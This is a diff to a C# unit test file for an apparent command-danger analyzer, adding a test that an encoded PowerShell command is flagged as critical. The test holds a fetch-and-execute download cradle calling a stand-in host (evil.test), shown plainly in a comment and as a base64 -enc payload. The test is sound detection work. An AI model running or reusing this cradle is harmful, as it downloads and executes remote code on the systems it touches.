@@ -64,6 +64,20 @@ public sealed class CommandAnalyzerObfuscationTests : IClassFixture<PatternLibra
     }
 
     [Fact]
+    public void EncodedWebClientCradle_SurfacesNet002Critical()
+    {
+        // UTF-16LE base64 of: IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')
+        // Before net-002 was broadened this decoded cradle only tripped net-006 (High), tying win-001
+        // (the -enc flag, also High) — so the report fell back to win-001 instead of the critical.
+        const string b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBwAC4AcABzADEAJwApAA==";
+        var match = _analyzer.Analyze($"powershell -enc {b64}");
+
+        Assert.NotNull(match);
+        Assert.Equal("net-002", match.RuleId);
+        Assert.Equal(ForemanSeverity.Critical, match.Severity);
+    }
+
+    [Fact]
     public void BenignCommand_StillNotFlagged_AfterNormalization()
         => Assert.Null(_analyzer.Analyze("dotnet build  Foreman.slnx   -c Release"));
 }
